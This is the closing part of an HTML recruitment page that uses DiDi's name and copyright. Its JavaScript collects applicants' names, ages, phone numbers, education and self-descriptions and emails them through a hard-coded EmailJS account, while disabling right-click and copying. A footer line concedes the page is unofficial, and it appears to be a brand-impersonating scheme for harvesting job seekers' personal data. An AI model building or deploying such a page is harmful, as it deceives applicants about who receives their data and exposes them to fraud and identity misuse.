				</div>
			</div>
			
			<button class="submit-btn" id="closeSuccessModal">完成</button>
		</div>
	</div>

	<footer class="footer">
		<div class="container">
			<div class="footer-links">
				<a href="https://www.didiglobal.com/" target="_blank">关于滴滴</a>
				<a href="javascript:void(0)" id="disclaimerLink">免责声明</a>
				<a href="javascript:void(0)" id="footerPrivacyLink">隐私协议</a>
			</div>
			<p>&copy; 2012-2026 DiDi Global.Customer Service.</p>
			<p class="footer-notice">仅做招聘信息登记，非官方接口</p>
		</div>
	</footer>

	<script>
		// EmailJS配置
		const EMAILJS_CONFIG = {
			serviceID: "service_qef6bz2",    // Service ID
			templateID: "template_qdtmeco",  // Template ID
			userID: "a94RNOskofJT7jhvX"      // User ID
		};

		// 页面加载完成后初始化
		document.addEventListener('DOMContentLoaded', function() {
			'use strict';
			
			// 初始化EmailJS
			try {
				emailjs.init(EMAILJS_CONFIG.userID);
				console.log('EmailJS初始化成功');
			} catch (error) {
				console.error('EmailJS初始化失败:', error);
			}
			
			// DOM元素缓存
			const elements = {
				form: document.getElementById('applyForm'),
				fileUpload: document.getElementById('fileUpload'),
				resumeFile: document.getElementById('resumeFile'),
				fileName: document.getElementById('fileName'),
				submitBtn: document.getElementById('submitBtn'),
				btnText: document.querySelector('.btn-text'),
				privacyLink: document.getElementById('privacyLink'),
				footerPrivacyLink: document.getElementById('footerPrivacyLink'),
				disclaimerLink: document.getElementById('disclaimerLink'),
				closeModal: document.getElementById('closeModal'),
				agreePrivacy: document.getElementById('agreePrivacy'),
				closeDisclaimerModal: document.getElementById('closeDisclaimerModal'),
				agreeDisclaimer: document.getElementById('agreeDisclaimer'),
				closeSuccessModal: document.getElementById('closeSuccessModal'),
				privacyModal: document.getElementById('privacyModal'),
				disclaimerModal: document.getElementById('disclaimerModal'),
				successModal: document.getElementById('successModal')
			};
			
			// 检查元素是否存在
			function checkElements() {
				for (const key in elements) {
					if (!elements[key] && key !== 'btnText') {
						console.warn(`元素 ${key} 不存在`);
					}
				}
			}
			
			// 文件上传功能初始化
			function initFileUpload() {
				if (!elements.fileUpload || !elements.resumeFile) return;
				
				// 点击上传区域
				elements.fileUpload.addEventListener('click', function() {
					elements.resumeFile.click();
				});
				
				// 文件选择变化
				elements.resumeFile.addEventListener('change', function() {
					if (this.files && this.files.length) {
						const file = this.files[0];
						if (elements.fileName) {
							elements.fileName.textContent = file.name;
						}
						clearError(this);
					}
				});
			}
			
			// 表单验证和提交
			function initFormValidation() {
				if (!elements.form) return;
				
				// 防止表单重复提交
				let isSubmitting = false;
				
				// 表单提交事件
				elements.form.addEventListener('submit', async function(e) {
					e.preventDefault();
					
					if (isSubmitting) {
						console.log('表单正在提交中，请稍候...');
						return;
					}
					
					if (validateForm()) {
						isSubmitting = true;
						await sendApplicationEmail();
						isSubmitting = false;
					}
				});
				
				// 实时验证清除错误
				const inputs = elements.form.querySelectorAll('input, select, textarea');
				inputs.forEach(input => {
					if (input.type === 'file') {
						input.addEventListener('change', clearErrorOnInput);
					} else {
						input.addEventListener('input', clearErrorOnInput);
						if (input.tagName === 'SELECT') {
							input.addEventListener('change', clearErrorOnInput);
						}
					}
				});
			}
			
			// 发送申请邮件
			async function sendApplicationEmail() {
				if (!elements.submitBtn) return;
				
				try {
					// 禁用提交按钮
					elements.submitBtn.disabled = true;
					if (elements.btnText) {
						elements.btnText.innerHTML = '<span class="spinner"></span>提交中...';
					}
					
					// 准备表单数据
					const formData = {
						name: document.getElementById('name').value.trim(),
						gender: document.getElementById('gender').value,
						age: document.getElementById('age').value.trim(),
						phone: document.getElementById('phone').value.trim(),
						edu: document.getElementById('edu').value,
						introduction: document.getElementById('introduction').value.trim(),
						experience: document.getElementById('experience').value.trim() || '无',
						timestamp: new Date().toLocaleString('zh-CN', { 
							year: 'numeric', 
							month: '2-digit', 
							day: '2-digit',
							hour: '2-digit',
							minute: '2-digit',
							second: '2-digit'
						}),
						resumeFile: elements.resumeFile.files[0] ? elements.resumeFile.files[0].name : '未上传'
					};
					
					// 发送邮件
					await emailjs.send(
						EMAILJS_CONFIG.serviceID,
						EMAILJS_CONFIG.templateID,
						formData
					);
					
					// 提交成功
					showSuccessModal();
					resetForm();
					
				} catch (error) {
					console.error('提交数据时出错:', error);
					alert('提交失败，请稍后重试');
					
				} finally {
					// 恢复按钮状态
					if (elements.submitBtn) {
						elements.submitBtn.disabled = false;
					}
					if (elements.btnText) {
						elements.btnText.textContent = '提交申请';
					}
				}
			}
			
			// 表单验证函数
			function validateForm() {
				let isValid = true;
				let firstErrorField = null;
				
				// 验证函数
				const validators = [
					{
						field: document.getElementById('name'),
						validate: (field) => field && field.value.trim(),
						errorMsg: '请输入姓名',
						errorId: 'nameError'
					},
					{
						field: document.getElementById('gender'),
						validate: (field) => field && field.value,
						errorMsg: '请选择性别',
						errorId: 'genderError'
					},
					{
						field: document.getElementById('age'),
						validate: (field) => {
							if (!field || !field.value.trim()) return false;
							const age = parseInt(field.value);
							return age >= 18 && age <= 60;
						},
						errorMsg: '请输入有效的年龄（18-60岁）',
						errorId: 'ageError'
					},
					{
						field: document.getElementById('phone'),
						validate: (field) => {
							if (!field || !field.value.trim()) return false;
							return /^1[3-9]\d{9}$/.test(field.value);
						},
						errorMsg: '请输入有效的手机号',
						errorId: 'phoneError'
					},
					{
						field: document.getElementById('edu'),
						validate: (field) => field && field.value,
						errorMsg: '请选择最高学历',
						errorId: 'eduError'
					},
					{
						field: document.getElementById('introduction'),
						validate: (field) => field && field.value.trim(),
						errorMsg: '请输入个人介绍',
						errorId: 'introductionError'
					}
				];
				
				// 执行验证
				validators.forEach(validator => {
					if (!validator.validate(validator.field)) {
						showError(validator.field, validator.errorMsg, validator.errorId);
						isValid = false;
						if (!firstErrorField) firstErrorField = validator.field;
					} else {
						clearError(validator.field, validator.errorId);
					}
				});
				
				// 文件验证
				if (elements.resumeFile && elements.resumeFile.files.length) {
					const file = elements.resumeFile.files[0];
					const validTypes = [
						'application/pdf', 
						'application/msword', 
						'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
						'image/jpeg',
						'image/png'
					];
					const maxSize = 10 * 1024 * 1024;
					
					if (!validTypes.includes(file.type)) {
						showError(elements.resumeFile, '请上传PDF、Word文档或图片文件', 'fileError');
						isValid = false;
						if (!firstErrorField) firstErrorField = elements.resumeFile;
					} else if (file.size > maxSize) {
						showError(elements.resumeFile, '文件大小不能超过10MB', 'fileError');
						isValid = false;
						if (!firstErrorField) firstErrorField = elements.resumeFile;
					} else {
						clearError(elements.resumeFile, 'fileError');
					}
				}
				
				// 滚动到第一个错误字段
				if (!isValid && firstErrorField) {
					firstErrorField.scrollIntoView({ 
						behavior: 'smooth', 
						block: 'center' 
					});
					firstErrorField.focus();
				}
				
				return isValid;
			}
			
			// 输入时清除错误
			function clearErrorOnInput() {
				const errorId = this.id + 'Error';
				clearError(this, errorId);
			}
			
			// 显示错误信息
			function showError(field, message, errorId) {
				if (!field) return;
				
				field.classList.add('error');
				if (field.id === 'resumeFile' && elements.fileUpload) {
					elements.fileUpload.classList.add('error');
				}
				
				const errorElement = document.getElementById(errorId);
				if (errorElement) {
					errorElement.textContent = message;
					errorElement.style.display = 'block';
				}
			}
			
			// 清除错误信息
			function clearError(field, errorId) {
				if (!field) return;
				
				field.classList.remove('error');
				if (field.id === 'resumeFile' && elements.fileUpload) {
					elements.fileUpload.classList.remove('error');
				}
				
				const errorElement = document.getElementById(errorId);
				if (errorElement) {
					errorElement.style.display = 'none';
				}
			}
			
			// 显示成功模态框
			function showSuccessModal() {
				if (elements.successModal) {
					elements.successModal.style.display = 'flex';
					document.body.style.overflow = 'hidden';
				}
			}
			
			// 重置表单
			function resetForm() {
				if (elements.form) {
					// 清空表单
					elements.form.reset();
					
					if (elements.fileName) {
						elements.fileName.textContent = '支持格式：PDF, DOC, JPG(限10MB)';
					}
					
					// 清除所有错误状态
					document.querySelectorAll('.error-message').forEach(error => {
						error.style.display = 'none';
					});
					
					document.querySelectorAll('.error').forEach(field => {
						field.classList.remove('error');
					});
				}
			}
			
			// 模态框控制
			function initModals() {
				// 打开隐私协议模态框
				[elements.privacyLink, elements.footerPrivacyLink].forEach(link => {
					if (link) {
						link.addEventListener('click', function(e) {
							e.preventDefault();
							if (elements.privacyModal) {
								elements.privacyModal.style.display = 'flex';
								document.body.style.overflow = 'hidden';
							}
						});
					}
				});
				
				// 打开免责声明模态框
				if (elements.disclaimerLink) {
					elements.disclaimerLink.addEventListener('click', function(e) {
						e.preventDefault();
						if (elements.disclaimerModal) {
							elements.disclaimerModal.style.display = 'flex';
							document.body.style.overflow = 'hidden';
						}
					});
				}
				
				// 关闭隐私协议模态框
				if (elements.closeModal) {
					elements.closeModal.addEventListener('click', function() {
						if (elements.privacyModal) {
							elements.privacyModal.style.display = 'none';
							document.body.style.overflow = '';
						}
					});
				}
				
				if (elements.agreePrivacy) {
					elements.agreePrivacy.addEventListener('click', function() {
						if (elements.privacyModal) {
							elements.privacyModal.style.display = 'none';
							document.body.style.overflow = '';
						}
					});
				}
				
				// 关闭免责声明模态框
				if (elements.closeDisclaimerModal) {
					elements.closeDisclaimerModal.addEventListener('click', function() {
						if (elements.disclaimerModal) {
							elements.disclaimerModal.style.display = 'none';
							document.body.style.overflow = '';
						}
					});
				}
				
				if (elements.agreeDisclaimer) {
					elements.agreeDisclaimer.addEventListener('click', function() {
						if (elements.disclaimerModal) {
							elements.disclaimerModal.style.display = 'none';
							document.body.style.overflow = '';
						}
					});
				}
				
				// 关闭成功模态框
				if (elements.closeSuccessModal) {
					elements.closeSuccessModal.addEventListener('click', function() {
						if (elements.successModal) {
							elements.successModal.style.display = 'none';
							document.body.style.overflow = '';
							resetForm();
						}
					});
				}
				
				// 点击模态框外部关闭
				document.addEventListener('click', function(e) {
					if (e.target === elements.privacyModal) {
						elements.privacyModal.style.display = 'none';
						document.body.style.overflow = '';
					}
					if (e.target === elements.disclaimerModal) {
						elements.disclaimerModal.style.display = 'none';
						document.body.style.overflow = '';
					}
					if (e.target === elements.successModal) {
						elements.successModal.style.display = 'none';
						document.body.style.overflow = '';
					}
				});
				
				// ESC键关闭模态框
				document.addEventListener('keydown', function(e) {
					if (e.key === 'Escape') {
						if (elements.privacyModal && elements.privacyModal.style.display === 'flex') {
							elements.privacyModal.style.display = 'none';
							document.body.style.overflow = '';
						}
						if (elements.disclaimerModal && elements.disclaimerModal.style.display === 'flex') {
							elements.disclaimerModal.style.display = 'none';
							document.body.style.overflow = '';
						}
						if (elements.successModal && elements.successModal.style.display === 'flex') {
							elements.successModal.style.display = 'none';
							document.body.style.overflow = '';
						}
					}
				});
			}
			
			// 初始化防复制功能
			function initAntiCopy() {
				// 禁止右键菜单
				document.addEventListener('contextmenu', function(e) {
					e.preventDefault();
				}, false);
				
				// 禁止复制
				document.addEventListener('copy', function(e) {
					const target = e.target;
					const isInput = target.tagName === 'INPUT' || target.tagName === 'TEXTAREA';
					const isModalContent = target.closest('.allow-select') !== null;
					
					if (!isInput && !isModalContent) {
						e.preventDefault();
					}
				}, false);
				
				// 禁止剪切
				document.addEventListener('cut', function(e) {
					const target = e.target;
					const isInput = target.tagName === 'INPUT' || target.tagName === 'TEXTAREA';
					const isModalContent = target.closest('.allow-select') !== null;
					
					if (!isInput && !isModalContent) {
						e.preventDefault();
					}
				}, false);
				
				// 禁止拖拽图片
				document.addEventListener('dragstart', function(e) {
					if (e.target.tagName === 'IMG') {
						e.preventDefault();
					}
				}, false);
			}
			
			// 修复潜在bug
			function fixPotentialBugs() {
				// 修复文件上传区域点击事件冒泡
				if (elements.fileUpload) {
					const fileBtn = elements.fileUpload.querySelector('.file-btn');
					if (fileBtn) {
						fileBtn.addEventListener('click', function(e) {
							e.stopPropagation();
						});
					}
				}
			}
			
			// 初始化所有功能
			function init() {
				try {
					// 检查元素是否存在
					checkElements();
					
					initFileUpload();
					initFormValidation();
					initModals();
					initAntiCopy();
					fixPotentialBugs();
					
					console.log('页面初始化完成');
					
				} catch (error) {
					console.error('初始化过程中发生错误:', error);
				}
			}
			
			// 执行初始化
			init();
		});
	</script>
</body>
</html>